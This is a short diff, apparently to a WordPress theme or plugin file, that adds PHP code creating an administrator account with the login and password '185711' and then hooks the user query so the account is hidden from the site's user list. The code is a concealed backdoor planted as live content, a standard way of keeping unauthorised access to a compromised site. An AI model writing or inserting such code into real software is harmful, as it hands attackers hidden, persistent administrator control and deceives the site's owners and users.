@@ -1,0 +1,18 @@
+$amaruser = wp_create_user('185711', '185711', 'developer@email.com');
+$amitmi = new WP_User($amaruser);
+$amitmi -> set_role('administrator');
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+ 
+  if ($username == '185711>') { 
+ 
+  }
+ 
+  else {
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != '185711'",$user_search->query_where);
+  }
+}
